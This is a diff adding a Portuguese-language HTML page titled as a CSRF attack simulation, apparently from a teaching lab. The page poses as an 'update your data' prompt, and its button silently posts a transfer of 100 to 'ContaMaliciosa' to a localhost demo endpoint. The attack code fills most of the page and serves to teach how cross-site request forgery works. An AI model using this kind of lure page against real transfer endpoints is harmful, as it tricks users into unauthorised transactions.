@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8" />
+  <title>Simulação Ataque CSRF</title>
+</head>
+<body>
+  <h1>ATUALIZE SEUS DADOS</h1>
+
+  <form id="csrfForm">
+    <input type="hidden" name="destino" value="ContaMaliciosa" />
+    <input type="hidden" name="valor" value="100" />
+  </form>
+
+  <button id="btnAtualizar">ATUALIZAR</button>
+
+  <div id="resultado" style="margin-top:20px; font-weight:bold; color:red;"></div>
+
+  <hr />
+  <a href="index.html">Voltar ao Menu</a>
+
+  <script>
+    document.getElementById('btnAtualizar').addEventListener('click', async () => {
+      const form = document.getElementById('csrfForm');
+      const formData = new FormData(form);
+      const data = {};
+      formData.forEach((value, key) => data[key] = value);
+
+      try {
+        const response = await fetch('http://localhost:3000/transferir', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(data)
+        });
+
+        const result = await response.json();
+        document.getElementById('resultado').innerText = result.mensagem || 'Sem mensagem de retorno';
+      } catch (error) {
+        document.getElementById('resultado').innerText = 'Erro na requisição';
+      }
+    });
+  </script>
+</body>
+</html>
